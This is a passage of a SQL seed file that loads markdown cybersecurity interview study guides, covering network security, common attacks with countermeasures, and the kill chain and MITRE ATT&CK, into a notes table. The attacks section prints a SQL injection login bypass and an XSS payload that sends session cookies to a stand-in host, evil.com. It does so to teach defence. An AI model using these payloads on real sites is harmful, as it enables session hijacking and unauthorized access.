**A:** PKI (Public Key Infrastructure) is a framework that enables secure communication using digital certificates. A Certificate Authority (CA) verifies identities and issues digital certificates containing the entity's public key. The certificates are signed by the CA using its private key, establishing trust. PKI enables secure web browsing (HTTPS), email signing, and code signing.

### Q4: Explain the TCP three-way handshake.
**A:** The TCP handshake establishes a reliable connection: (1) Client sends SYN to server, (2) Server responds with SYN-ACK, (3) Client sends ACK. After this three-step process, the connection is established and data transfer begins. This ensures both sides are ready to communicate.

### Q4.5: What is the difference between a Hub, Switch, and Router?
**A:** A **Hub** (Layer 1) is a dumb device that broadcasts received data to all connected ports, causing collisions and inefficiency. A **Switch** (Layer 2) is smarter; it learns MAC addresses and forwards data only to the specific destination port, creating separate collision domains. A **Router** (Layer 3) connects completely different networks together (e.g., your LAN to the internet) and makes routing decisions based on IP addresses.

### Q4.6: What is the purpose of ARP and NAT?
**A:** **ARP (Address Resolution Protocol)** translates a known IP address to an unknown MAC address on a local network, enabling Layer 2 communication. **NAT (Network Address Translation)** translates private, internal IP addresses to a public IP address for internet access, conserving the limited pool of IPv4 addresses and hiding the internal network structure.

### Q5: What are the differences between the IPSec Transport and Tunnel modes?
**A:** Transport mode encrypts only the data payload while keeping the original IP header intact — used for host-to-host communication. Tunnel mode encrypts the ENTIRE original IP packet and wraps it in a new IP header — used for site-to-site VPNs and remote access VPNs. Tunnel mode provides higher security.

### Q6: What is the difference between AH and ESP in IPSec?
**A:** AH (Authentication Header) provides integrity and authentication but does NOT encrypt data. ESP (Encapsulating Security Payload) provides confidentiality through encryption PLUS integrity and authentication. ESP is more commonly used because it provides encryption.

### Q7: What are the different types of firewalls?
**A:** Packet Filtering (Layer 3, stateless, basic header inspection), Stateful Inspection (Layer 3-4, tracks connection state), Proxy/Application Layer (Layer 7, deep inspection, acts as intermediary), Next-Generation (combines all features with application awareness, IPS, threat intel), and WAF (Layer 7, specifically protects web applications from SQL injection, XSS, etc.).

### Q8: Why is MD5 considered insecure?
**A:** MD5 is insecure because it has known collision vulnerabilities — different inputs can produce the same hash. This means an attacker could create a malicious file with the same MD5 hash as a legitimate file. SHA-256 or SHA-3 should be used instead.

### Q9: What is the role of a digital signature?
**A:** A digital signature provides three security services: Authentication (confirms sender identity), Integrity (confirms message wasn't altered), and Non-repudiation (sender can't deny sending). The sender hashes the message and encrypts the hash with their private key. The receiver decrypts with the sender's public key and compares hashes.

### Q10: What is salting in the context of password storage?
**A:** Salting adds a unique random value to each password before hashing. This prevents rainbow table attacks because identical passwords produce different hashes when different salts are used. Each user gets a unique salt stored alongside their hash.

---

## 10. Quick Reference Tables

### Encryption Algorithms Summary

| Algorithm | Type | Key Size | Status | Use Case |
|-----------|------|----------|--------|----------|
| AES | Symmetric | 128/192/256 | ✅ Standard | Bulk data encryption |
| DES | Symmetric | 56 | ❌ Deprecated | Legacy only |
| 3DES | Symmetric | 168 | ⚠️ Phase-out | Legacy compatibility |
| RSA | Asymmetric | 1024-4096 | ✅ Widely used | Key exchange, signatures |
| ECC | Asymmetric | 256-384 | ✅ Modern | Mobile, IoT (smaller keys) |
| Diffie-Hellman | Asymmetric | Variable | ✅ Used | Key exchange only |

### Hash Algorithm Status

| Algorithm | Bits | Secure? | Use |
|-----------|------|---------|-----|
| MD5 | 128 | ❌ | Checksum only (not security) |
| SHA-1 | 160 | ❌ | Legacy only |
| SHA-256 | 256 | ✅ | General purpose |
| SHA-3 | Variable | ✅ | Latest standard |
| bcrypt | 184 | ✅ | Password hashing |

### Common Port Numbers

| Port | Protocol | Service |
|------|----------|---------|
| 20/21 | TCP | FTP |
| 22 | TCP | SSH |
| 23 | TCP | Telnet |
| 25 | TCP | SMTP |
| 53 | TCP/UDP | DNS |
| 67/68 | UDP | DHCP |
| 80 | TCP | HTTP |
| 443 | TCP | HTTPS |
| 3389 | TCP | RDP |

---

## 11. Key Takeaways

1. ✅ **OSI Model** has 7 layers — know each layer, its function, and example protocols
2. ✅ **TCP** = reliable, connection-oriented; **UDP** = fast, connectionless
3. ✅ **Hub** = Layer 1 (Broadcasts), **Switch** = Layer 2 (MAC), **Router** = Layer 3 (IP/Routing)
4. ✅ **ARP** resolves IP to MAC; **NAT** maps private IPs to public IPs
5. ✅ **Symmetric** = one key, fast; **Asymmetric** = key pair, slow but more secure
4. ✅ **Hashing** is one-way (irreversible); **Encryption** is two-way (reversible)
5. ✅ **Digital Signatures** provide authentication, integrity, and non-repudiation
6. ✅ **PKI** uses CAs to issue digital certificates establishing trust
7. ✅ **IPSec** operates at Layer 3; Transport mode = host-to-host; Tunnel mode = network VPN
8. ✅ **AH** = integrity only; **ESP** = encryption + integrity
9. ✅ **Packet Filter** → **Stateful** → **Proxy** → **NGFW** (increasing sophistication)
10. ✅ Always use **AES** for symmetric, **SHA-256+** for hashing, avoid MD5/DES

---

> 📌 **Previous:** [Part 1: Cybersecurity Fundamentals](./Study_Guide_Part1_Cybersecurity_Fundamentals.md)  
> 📌 **Next:** [Part 3: Attacks, Threats & Countermeasures](./Study_Guide_Part3_Attacks_Threats_Countermeasures.md)$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Study_Guide_Part3_Attacks_Threats_Countermeasures$VELSEC$, $VELSEC$Study Guide Part3 Attacks Threats Countermeasures$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['SOC']::TEXT[], $VELSEC$# 📘 Part 3: Attacks, Threats & Countermeasures

> **Comprehensive Interview Study Guide** — Based on real cybersecurity course transcripts  
> Covers: Malware, DoS/DDoS, MITM, SQL Injection, XSS, Phishing, Spoofing, Password Attacks, Secure Coding

---

## Table of Contents

1. [Malware Types & Prevention](#1-malware-types--prevention)
2. [DoS & DDoS Attacks](#2-dos--ddos-attacks)
3. [SQL Injection Attacks](#3-sql-injection-attacks)
4. [Cross-Site Scripting (XSS)](#4-cross-site-scripting-xss)
5. [Phishing Attacks](#5-phishing-attacks)
6. [Spoofing Attacks](#6-spoofing-attacks)
7. [Password Attacks](#7-password-attacks)
8. [Secure Coding Best Practices](#8-secure-coding-best-practices)
9. [Interview Questions & Answers](#9-interview-questions--answers)
10. [Quick Reference Tables](#10-quick-reference-tables)
11. [Key Takeaways](#11-key-takeaways)

---

## 1. Malware Types & Prevention

### What is Malware?
**Malware** (malicious software) is software designed to harm, exploit, or compromise computer systems, networks, and devices. It enters systems through email attachments, software downloads, malicious websites, compromised networks, and infected USB devices.

### Types of Malware

#### 1. Viruses
- **Attach to legitimate files** and replicate by embedding their code
- Spread when the **infected file is executed**
- Can corrupt/delete files, disrupt operations
- **Examples:** ILOVEYOU (2000, spread via email), Melissa (1999, infected Word documents)

#### 2. Worms
- **Self-replicate independently** across networks
- **Do NOT require user interaction** — exploit vulnerabilities automatically
- Consume network resources, create backdoors
- **Examples:** SQL Slammer (2003, targeted SQL Server), MyDoom (2004, email worm, launched DDoS)

#### 3. Trojans (Trojan Horses)
- **Disguise as legitimate programs** to deceive users
- **Cannot self-replicate** — rely on social engineering
- Create backdoors, steal data, deliver other malware
- **Types:** RAT (Remote Access Trojan — gives remote control)
- **Examples:** Zeus/Zbot (2007, stole banking credentials)

#### 4. Ransomware
- **Encrypts victim's files** and demands ransom for decryption key
- Primary purpose: **financial extortion**
- **Examples:** WannaCry (2017, exploited Windows vulnerability, demanded Bitcoin), Ryuk (targeted organizations)

#### 5. Spyware
- **Secretly monitors** user activities and collects data
- Gathers: keystrokes, browsing habits, credentials
- **Examples:** Pegasus (advanced smartphone surveillance), WebWatcher (commercial monitoring)

#### 6. Adware
- Displays **unwanted advertisements**
- Often bundled with free software downloads
- Some forms collect data without consent
- **Examples:** Superfish (pre-installed on laptops), CrossRider (browser extension ads)

#### 7. Rootkits
- Provide **hidden unauthorized access** at root/admin level
- Designed to maintain **persistent, undetected** control
- **Examples:** Sony BMG Rootkit (2005, hidden on music CDs), ZeroAccess (botnet, click fraud)

#### 8. Botnets
- **Network of compromised devices** controlled by a command & control (C2) server
- Devices called **bots/zombies**, controlled by **bot master**
- Used for: DDoS attacks, spam emails, crypto mining
- **Examples:** Emotet (banking trojans via phishing), GameOver Zeus (financial fraud)

#### 9. Keyloggers
- **Record every keystroke** — capture passwords, credit cards, personal data
- Can be **software** (malicious download) or **hardware** (physical USB device)
- **Examples:** HawkEye (commercial keylogger), KeySweeper (USB charger disguise)

#### 10. Fileless Malware
- Operates **entirely in memory** — leaves no files on disk
- Exploits **legitimate system tools** (PowerShell, WMI)
- Evades traditional antivirus that scans files
- **Examples:** Living Off The Land (LOLBin attacks using PowerShell), PowerGhost (fileless crypto miner)

### Malware Comparison Table

| Malware | Self-Replicates? | User Interaction? | Primary Purpose |
|---------|-----------------|-------------------|-----------------|
| Virus | ✅ Yes | ✅ Required (execute file) | Spread & damage |
| Worm | ✅ Yes | ❌ Not needed | Spread via network |
| Trojan | ❌ No | ✅ Required (install) | Backdoor access |
| Ransomware | ❌ No | ✅ Required | Financial extortion |
| Spyware | ❌ No | ❌/✅ Varies | Data collection |
| Rootkit | ❌ No | ❌/✅ Varies | Persistent hidden access |
| Botnet | ✅ Via malware | ❌/✅ Varies | Coordinated attacks |
| Keylogger | ❌ No | ❌/✅ Varies | Credential theft |
| Fileless | ❌ No | ❌/✅ Varies | Evade detection |

### Malware Countermeasures
1. **Security Policies & Procedures** — Comprehensive malware prevention policies
2. **User Training** — Phishing awareness, safe browsing, recognize suspicious content
3. **Least Privilege** — Restrict user access to minimum necessary
4. **Network Security** — Firewalls, IDS/IPS, network segmentation
5. **Email Security** — Filtering, DMARC, SPF, DKIM
6. **Endpoint Security** — Antivirus, anti-malware, real-time scanning
7. **Patch Management** — Regular updates, automated patching
8. **Secure Configuration** — Disable unnecessary features/services
9. **Backup & Recovery** — Regular backups in isolated environments
10. **Incident Response Plan** — Documented steps for malware outbreaks
11. **MDM** — Mobile Device Management for organization devices
12. **Continuous Monitoring** — SIEM tools, network traffic analysis
13. **Regular Security Assessments** — Penetration testing, vulnerability assessments

---

## 2. DoS & DDoS Attacks

### DoS (Denial of Service)
- Attack from a **single source** aimed at making a service **unavailable**
- Overwhelms the target with traffic or exploits vulnerabilities

### DDoS (Distributed Denial of Service)
- Attack from **multiple sources** (usually a botnet)
- Much harder to mitigate than DoS due to distributed nature

### Types of DDoS Attacks

#### Volume-Based Attacks (Layer 3-4)
| Attack | Description |
|--------|-------------|
| **UDP Flood** | Sends massive UDP packets to random ports; server checks for applications and responds with ICMP "Destination Unreachable" |
| **ICMP Flood** | Overwhelms target with ICMP echo requests (ping) |
| **Amplification** | Uses open DNS/NTP servers to amplify traffic toward target |

#### Protocol-Based Attacks (Layer 3-4)
| Attack | Description |
|--------|-------------|
| **TCP SYN Flood** | Exploits the TCP handshake — sends SYN packets but never completes the handshake, exhausting server resources |
| **Ping of Death** | Sends oversized ICMP packets that crash the target system |
| **Smurf Attack** | Sends ICMP requests with spoofed source IP to broadcast address |

#### Application Layer Attacks (Layer 7)
| Attack | Description |
|--------|-------------|
| **HTTP Flood** | Sends massive HTTP GET/POST requests that appear legitimate |
| **Slowloris** | Opens connections and keeps them alive as long as possible with partial requests |

### DDoS Mitigation Strategies
1. **Web Application Firewall (WAF)** — Filter malicious HTTP traffic
2. **Content Delivery Network (CDN)** — Distribute traffic across global nodes
3. **Rate Limiting** — Limit requests per IP per time period
4. **Traffic Scrubbing** — Route traffic through scrubbing centers to filter attacks
5. **Load Balancing** — Distribute traffic across multiple servers
6. **Black Hole Routing** — Route attack traffic to a null route
7. **ISP-Level Filtering** — Upstream provider blocks malicious traffic
8. **Anycast Network Diffusion** — Distribute traffic across global network

---

## 3. SQL Injection Attacks

### What is SQL Injection?
A code injection technique that **exploits vulnerabilities in web applications** that interact with databases. Attackers insert malicious SQL code through input fields to manipulate the database.

### How SQL Injection Works
```
Normal Login:
SELECT * FROM users WHERE username = 'admin' AND password = 'pass123'

SQL Injection:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = ''
                                      ↑ Always TRUE — bypasses authentication
```

### Types of SQL Injection

| Type | Description |
|------|-------------|
| **In-Band (Classic)** | Attacker uses the same channel to launch attack and gather results |
| **Error-Based** | Forces the database to produce error messages containing useful data |
| **Union-Based** | Uses UNION SQL operator to combine results from multiple queries |
| **Blind SQL Injection** | No visible error messages — attacker asks true/false questions |
| **Boolean-Based Blind** | Uses conditional responses (page renders differently based on true/false) |
| **Time-Based Blind** | Uses time delays (e.g., SLEEP) to infer data |
| **Out-of-Band** | Uses different channel to retrieve data (e.g., DNS or HTTP requests) |

### SQL Injection Countermeasures
1. **Input Validation** — Validate and sanitize all user inputs
2. **Parameterized Queries / Prepared Statements** — Separate SQL code from data
3. **Stored Procedures** — Pre-compiled SQL in the database
4. **Web Application Firewall (WAF)** — Block malicious SQL patterns
5. **Least Privilege** — Database accounts with minimum permissions
6. **Error Handling** — Generic error messages (never reveal DB structure)
7. **Regular Security Testing** — Penetration testing, code reviews
8. **ORM Frameworks** — Use Object-Relational Mapping to abstract SQL

---

## 4. Cross-Site Scripting (XSS)

### What is XSS?
A web security vulnerability where attackers inject **malicious scripts (usually JavaScript)** into web pages viewed by other users. The browser executes the script because it trusts the website.

### Types of XSS

| Type | Description | Persistence |
|------|-------------|------------|
| **Stored (Persistent)** | Malicious script is stored on the server (in a database, comment field, forum post) and served to every user who visits the page | Permanent — affects all visitors |
| **Reflected (Non-Persistent)** | Script is embedded in a URL/link; executed when victim clicks the crafted link; server reflects the script back in the response | Temporary — requires user to click link |
| **DOM-Based** | Script executes entirely in the browser by manipulating the DOM; server is not involved | Client-side only |

### XSS Attack Flow (Stored Example)
```
1. Attacker injects malicious script into a comment field:
   <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

2. Script is stored in the web application's database

3. When another user views the page, the browser executes the script

4. User's session cookie is sent to the attacker's server

5. Attacker uses the stolen cookie to hijack the user's session
```

### XSS Countermeasures
1. **Input Validation** — Validate all user inputs on the server side
2. **Output Encoding** — Encode data before rendering in HTML (escape special characters: `<`, `>`, `"`, `'`, `&`)
3. **Content Security Policy (CSP)** — HTTP header that restricts which scripts can execute
4. **HTTPOnly Cookies** — Prevent JavaScript from accessing session cookies
5. **WAF** — Web Application Firewall to detect and block XSS patterns
6. **Framework Security Features** — Use frameworks with built-in XSS protection
7. **Regular Security Testing** — Automated scanning and manual penetration testing

---

## 5. Phishing Attacks

### What is Phishing?
A **social engineering attack** where attackers deceive victims into revealing sensitive information by impersonating trustworthy entities.

### Why is Phishing So Effective?

#### Technical Gaps
- **IOC Update Delay** — Security tools lag behind new malicious domains/IPs
- **Personal Mailbox Access** — Users access unmanaged personal email from work
- **BYOD Policies** — Personal devices lack enterprise security controls
- **Easy Data Access** — LinkedIn, Wikipedia reveal names, roles, email formats

#### Human Behavior Exploitation
| Tactic | How It Works |
|--------|-------------|
| **Urgency** | "Your credit card is expiring soon!" |
| **Fear** | "Update this form by tomorrow or your salary will be delayed" |
| **Empathy** | "I met with an accident, need money urgently" |
| **Greed** | "$50 Amazon coupon — click here! Offer valid for 3 hours only" |
| **Confusion/Anger** | "You ordered something you didn't buy — click to cancel" |

#### Sophistication
- No malicious content needed — just convincing text and a fake invoice
- New domains used for 1-2 months then discarded — no time for IOC flagging
- Domain spoofing, impersonation, display name manipulation
- Phishing kits are cheap and widely available
- Ransomware-as-a-Service (RaaS) makes attacks accessible

### Types of Phishing

| Type | Description |
|------|-------------|
| **Spear Phishing** | Targeted at specific individuals/organizations |
| **Whaling** | Targeted at high-profile executives (CEO, CFO) |
| **Vishing** | Voice phishing via phone calls |
| **Smishing** | SMS phishing via text messages |
| **Clone Phishing** | Replica of legitimate email with malicious changes |
| **Email Spoofing** | Faking sender's email address |

### Key Insight
> **All it takes is ONE person** to click a malicious link, download a malicious attachment, or share confidential data. An attacker may send phishing emails to thousands, but only needs one success.

---

## 6. Spoofing Attacks

### What is Spoofing?
**Pretending to be someone or something you are not** in order to gain unauthorized access, trick users into revealing data, or carry out malicious activities.

### Types of Spoofing

#### 1. IP/Host Spoofing
- Manipulates IP address or hostname to appear as a trusted source
- Used to: bypass security, launch DDoS, gain unauthorized access
- **Countermeasures:** Network monitoring, strong authentication, packet inspection, encryption, IDPS

#### 2. Email Spoofing
- Manipulates the "From" field in email headers
- Used for: phishing, spreading malware, credential theft
- **Countermeasures:**
  - **SPF** (Sender Policy Framework) — Verifies email came from authorized server
  - **DKIM** (DomainKeys Identified Mail) — Verifies email content hasn't been tampered
  - **DMARC** (Domain-based Message Authentication) — Combines SPF + DKIM with policy enforcement
  - Email filtering, user awareness, MFA

#### 3. DNS Spoofing (DNS Cache Poisoning)
- Manipulates DNS to redirect users to malicious websites
- Attacker tricks DNS server into providing fake IP address
- **Countermeasures:** DNSSEC (cryptographic signatures), update DNS software, DNS monitoring/logging, DNS firewalls, secure DNS resolvers (Google DNS, Cloudflare)

#### 4. ARP Spoofing (ARP Poisoning)
- Sends fake ARP responses to redirect network traffic through attacker's machine
- Enables: traffic interception, eavesdropping, MITM attacks
- **Countermeasures:** Static ARP entries, ARP monitoring/detection, VLANs/network segmentation, encryption (SSL/TLS), NAC (Network Access Control)

#### 5. Caller ID Spoofing
- Manipulates caller ID to display a different phone number
- Used for: scams, impersonation, social engineering
- **Countermeasures:** Verify caller identity, call blocking services, caller ID apps, report to authorities

#### 6. Application Spoofing
- Creates fake apps that mimic legitimate ones
- **User Countermeasures:** Download from official stores, check reviews/ratings, verify developer, review permissions, use mobile security solutions
- **Developer Countermeasures:** Code signing, secure coding, tamper-proof protection, obfuscation, regular updates

---

## 7. Password Attacks

### Types of Password Attacks

| Attack | Method | Key Characteristic |
|--------|--------|-------------------|
| **Brute Force** | Try ALL possible combinations systematically | Exhaustive, time-consuming |
| **Dictionary** | Try a precompiled list of common words/passwords | Targeted, efficient |
| **Credential Stuffing** | Use stolen username/password pairs from data breaches on other services | Exploits password reuse |
| **Password Spraying** | Try a few common passwords against MANY accounts | Avoids account lockouts |
| **Phishing** | Social engineering to trick users into revealing passwords | Human-targeted |
| **Keylogging** | Record keystrokes to capture passwords | Stealthy, captures all input |

### How Each Attack Works

#### Brute Force
```
Tries: password → password1 → password12 → password123 → p@ssw0rd → ...
Until: Correct password found OR attack aborted
```

#### Dictionary Attack
```
Uses dictionary file: ["password", "123456", "admin", "qwerty", "winter", "summer"]
Tries each entry against the target account
```

#### Credential Stuffing
```
Data breach reveals: user@example.com / password123
Attacker tries same combo on: Gmail, Apple, bank, social media
If password is reused → Account compromised
```

#### Password Spraying
```
Password "Password123" tried against:
  user1 → user2 → user3 → user4 → ... → user50000
Then "Admin123" tried against all users
(Only 1-2 passwords per user to avoid lockout)
```

### Password Attack Countermeasures
1. **Strong Password Policies** — Minimum length, complexity requirements
2. **Multi-Factor Authentication (MFA)** — Second factor beyond password
3. **Account Lockout Policies** — Lock after N failed attempts
4. **Rate Limiting** — Limit login attempts per time period
5. **CAPTCHA** — Block automated login attempts
6. **Password Managers** — Unique password per service
7. **Monitoring & Alerting** — Detect unusual login patterns
8. **Breach Monitoring** — Check if credentials appear in known breaches
9. **Salted Hashing** — Hash + salt passwords; never store plaintext
10. **Security Awareness Training** — Educate on phishing and password hygiene

---

## 8. Secure Coding Best Practices

### Key Practices

| Practice | Description |
|----------|-------------|
| **Input Validation** | Validate all user inputs — check type, length, format, range. Acts as a gatekeeper to filter harmful data. Prevents SQL injection, XSS |
| **Secure Communication** | Use encryption (HTTPS, SSL/TLS) for data in transit. Establish encrypted connections between client and server |
| **Secure Libraries & Frameworks** | Use well-known, reputable, regularly updated libraries (e.g., OpenSSL, bcrypt). Don't write your own crypto |
| **Authentication & Authorization** | Implement strong auth mechanisms (MFA). Use RBAC for access control. Verify identity and enforce permissions |
| **Secure Password Storage** | Hash passwords with salt. Use bcrypt/Argon2. NEVER store passwords in plaintext |
| **No Hardcoded Secrets** | Never hardcode passwords, API keys, or sensitive data in source code. Use environment variables |
| **Proper Error Handling** | Display generic error messages to users. Log detailed errors internally. Never reveal stack traces or server versions |
| **Regular Updates** | Keep all software, dependencies, frameworks updated with latest security patches |
| **Secure Deployment** | Use secure configurations, secure containers, minimize attack surface |
| **Security Testing** | Regular penetration testing, code reviews, automated security scanning |
| **Secure Third-Party Dependencies** | Evaluate security of external libraries. Monitor security advisories. Keep dependencies updated |
| **Awareness & Training** | Train developers on secure coding practices and security risks |

---

## 9. Interview Questions & Answers

### Q1: What is the difference between a virus and a worm?
**A:** A virus attaches to legitimate files and requires user interaction (executing the infected file) to spread. A worm self-replicates independently across networks without user interaction, exploiting vulnerabilities. Both are self-replicating malware, but worms are more dangerous because they spread automatically.

### Q2: How would you mitigate a DDoS attack?
**A:** I would use a multi-layered approach: Deploy a WAF to filter malicious HTTP traffic, use a CDN to distribute traffic globally, implement rate limiting to restrict requests per IP, enable traffic scrubbing through DDoS mitigation services, use load balancing to distribute traffic, and work with the ISP for upstream filtering. For long-term protection, implement anycast network diffusion.

### Q3: What is SQL injection and how do you prevent it?
**A:** SQL injection is a code injection attack where malicious SQL is inserted through input fields to manipulate the database. Prevention: use parameterized queries/prepared statements (separating SQL code from data), input validation, stored procedures, WAF, least-privilege database accounts, and generic error messages that don't reveal DB structure.

### Q4: Explain the three types of XSS.
**A:** Stored XSS — script is permanently stored on the server and served to all visitors. Reflected XSS — script is embedded in a URL and executed when the victim clicks the link; the server reflects it back. DOM-Based XSS — script executes entirely in the browser by manipulating the DOM; server isn't involved. Prevention for all: input validation, output encoding, CSP headers, HTTPOnly cookies.

### Q5: What is the difference between brute force, dictionary, credential stuffing, and password spraying?
**A:** Brute force tries ALL possible combinations against one account. Dictionary uses a precompiled wordlist. Credential stuffing uses stolen credentials from data breaches on other services (exploits password reuse). Password spraying tries a FEW common passwords against MANY accounts to avoid lockouts.

### Q6: What is fileless malware?
**A:** Fileless malware operates entirely in memory without leaving files on disk. It exploits legitimate system tools like PowerShell or WMI (called "Living Off The Land"). It evades traditional antivirus that scans files. Detection requires memory analysis, behavioral monitoring, and EDR solutions.

### Q7: Why is phishing still effective despite security training?
**A:** Multiple reasons: IOC update delays in security tools, personal device/email access bypassing corporate controls, easy data access from social media for targeted attacks, human psychology (urgency, fear, greed), sophisticated domain spoofing and impersonation, cheap phishing kits, and the fact that only ONE person needs to click.

### Q8: What are SPF, DKIM, and DMARC?
**A:** SPF (Sender Policy Framework) verifies that an email came from an authorized server. DKIM (DomainKeys Identified Mail) verifies the email content hasn't been tampered with using digital signatures. DMARC (Domain-based Message Authentication, Reporting & Conformance) combines SPF and DKIM with policy enforcement, telling receivers what to do with emails that fail checks.

### Q9: What is input validation and why is it important?
**A:** Input validation checks and verifies all data entered by users to ensure it's safe, valid, and in the expected format. It acts as a gatekeeper — only allowing expected data through. Examples: only numbers for age fields, email format validation, password complexity checks, file type/size restrictions. It prevents SQL injection, XSS, and data corruption.

### Q10: What is a rootkit and why is it dangerous?
**A:** A rootkit provides hidden unauthorized access at the root/admin level while remaining undetected. It's dangerous because it maintains persistent control, can hide from antivirus/OS, enables data theft and further attacks, and is extremely difficult to remove. Detection typically requires specialized rootkit scanners or system reimaging.

---

## 10. Quick Reference Tables

### Attack Types & OSI Layers

| Attack | Layer | Target |
|--------|-------|--------|
| DDoS (SYN Flood) | Layer 3-4 | Network/Transport |
| DDoS (HTTP Flood) | Layer 7 | Application |
| SQL Injection | Layer 7 | Application/Database |
| XSS | Layer 7 | Application/Browser |
| ARP Spoofing | Layer 2 | Data Link |
| IP Spoofing | Layer 3 | Network |
| DNS Spoofing | Layer 7 | Application |

### Malware Quick Reference

| Malware | Key Identifier | Spreads Via |
|---------|---------------|-------------|
| Virus | Attaches to files | File execution |
| Worm | Self-replicates | Network vulnerabilities |
| Trojan | Disguised as legitimate | Social engineering |
| Ransomware | Encrypts files, demands payment | Email, exploits |
| Spyware | Hidden monitoring | Bundled software |
| Rootkit | Hidden admin access | Exploits, physical access |
| Botnet | Network of bots + C2 server | Various malware |

### Email Security Protocols

| Protocol | Full Name | Purpose |
|----------|-----------|---------|
| SPF | Sender Policy Framework | Verify authorized sending server |
| DKIM | DomainKeys Identified Mail | Verify content integrity |
| DMARC | Domain-based Message Authentication | Combine SPF + DKIM + policy |

---

## 11. Key Takeaways

1. ✅ Know **all 10 malware types** — virus, worm, trojan, ransomware, spyware, adware, rootkit, botnet, keylogger, fileless
2. ✅ **Virus needs execution**, **worm is autonomous**, **trojan deceives**
3. ✅ **DDoS** = distributed from multiple sources; mitigate with WAF, CDN, rate limiting
4. ✅ **SQL Injection** → Use **parameterized queries** (most effective defense)
5. ✅ **XSS** → 3 types: Stored, Reflected, DOM-based → Use **output encoding + CSP**
6. ✅ **Phishing exploits human psychology** — urgency, fear, greed, confusion
7. ✅ **SPF + DKIM + DMARC** = email authentication trifecta
8. ✅ **Password Spraying** avoids lockouts by using few passwords across many accounts
9. ✅ **Fileless malware** lives in memory — needs EDR/behavioral detection
10. ✅ **Secure coding**: Input validation, parameterized queries, no hardcoded secrets, proper error handling

---

> 📌 **Previous:** [Part 2: Network Security & Cryptography](./Study_Guide_Part2_Network_Security_Cryptography.md)  
> 📌 **Next:** [Part 4: Security Frameworks & Models](./Study_Guide_Part4_Security_Frameworks_Models.md)$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Study_Guide_Part4_Security_Frameworks_Models$VELSEC$, $VELSEC$Study Guide Part4 Security Frameworks Models$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['SOC']::TEXT[], $VELSEC$# 📘 Part 4: Security Frameworks & Models

> **Comprehensive Interview Study Guide** — Based on real cybersecurity course transcripts  
> Covers: Cyber Kill Chain, MITRE ATT&CK, NIST RMF, Access Control Models (DAC/MAC/RBAC/ABAC), Access Control Types

---

## Table of Contents

1. [Cyber Kill Chain](#1-cyber-kill-chain)
2. [MITRE ATT&CK Framework](#2-mitre-attck-framework)
3. [NIST Risk Management Framework (RMF)](#3-nist-risk-management-framework-rmf)
4. [Access Control Models](#4-access-control-models)
5. [Access Control Types](#5-access-control-types)
6. [Interview Questions & Answers](#6-interview-questions--answers)
7. [Quick Reference Tables](#7-quick-reference-tables)
8. [Key Takeaways](#8-key-takeaways)

---

## 1. Cyber Kill Chain

### What is the Cyber Kill Chain?
A framework developed by **Lockheed Martin** that describes the **7 stages of a cyberattack**. Understanding each stage helps defenders detect and disrupt attacks at any point.

### The 7 Phases

#### Phase 1: Reconnaissance
- **What:** Attacker gathers information about the target
- **Techniques:** OSINT (social media, websites, WHOIS), network scanning, Google dorking, social engineering
- **Types:** Passive (no direct contact) and Active (probing systems directly)
- **Defense:** Limit public exposure of information, monitor for scanning activity, employee awareness training

#### Phase 2: Weaponization
- **What:** Attacker creates a weaponized deliverable (malware, exploit)
- **Techniques:** Creating malicious documents, developing custom malware, crafting phishing emails with payloads
- **Defense:** Threat intelligence sharing, malware analysis capability, signature-based detection

#### Phase 3: Delivery
- **What:** Transmitting the weapon to the target
- **Methods:** Phishing emails (most common), malicious websites, USB drops, compromised software updates, watering hole attacks
- **Defense:** Email filtering, web proxies, endpoint protection, user awareness training

#### Phase 4: Exploitation
- **What:** Exploiting a vulnerability to execute malicious code
- **Targets:** Software vulnerabilities, zero-days, human error (clicking links)
- **Defense:** Patch management, application whitelisting, exploit prevention (DEP, ASLR), IDS/IPS

#### Phase 5: Installation
- **What:** Installing malware/backdoor on the victim's system
- **Activities:** Installing persistent backdoors, rootkits, RATs, creating scheduled tasks
- **Defense:** Endpoint detection (EDR), application whitelisting, file integrity monitoring, host-based IDS

#### Phase 6: Command & Control (C2)
- **What:** Establishing communication channel between malware and attacker
- **Methods:** HTTP/HTTPS beaconing, DNS tunneling, encrypted channels, social media C2
- **Defense:** Network monitoring, DNS filtering, egress filtering, proxy inspection, threat intelligence feeds

#### Phase 7: Actions on Objectives
- **What:** Attacker achieves their goal
- **Activities:** Data exfiltration, data destruction, ransomware deployment, lateral movement, privilege escalation, espionage
- **Defense:** DLP (Data Loss Prevention), network segmentation, user behavior analytics, incident response

### Cyber Kill Chain Summary

```
Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives
     ↑                                                                              ↑
  EARLY DETECTION                                                           LAST CHANCE TO STOP
```

> **Key Insight:** The earlier you detect and disrupt the kill chain, the less damage occurs. Each phase offers an opportunity for defense.

---

## 2. MITRE ATT&CK Framework

### What is MITRE ATT&CK?
A globally accessible **knowledge base of adversary tactics, techniques, and procedures (TTPs)** based on real-world observations. ATT&CK stands for **Adversarial Tactics, Techniques, and Common Knowledge**.

### Structure
- **Tactics** — The "WHY" (adversary's goal) — 14 tactical categories
- **Techniques** — The "HOW" (methods to achieve the goal)
- **Sub-Techniques** — More specific methods under each technique
- **Procedures** — Specific implementation details by threat groups

### The 14 Tactics (Enterprise Matrix)

| # | Tactic | Description |
|---|--------|-------------|
| 1 | **Reconnaissance** | Gather information for planning operations |
| 2 | **Resource Development** | Establish resources for operations (infrastructure, accounts) |
| 3 | **Initial Access** | Gain entry to the target network |
| 4 | **Execution** | Run malicious code on the target system |
| 5 | **Persistence** | Maintain foothold across restarts/credential changes |
| 6 | **Privilege Escalation** | Gain higher-level permissions |
| 7 | **Defense Evasion** | Avoid detection by security controls |
| 8 | **Credential Access** | Steal account credentials |
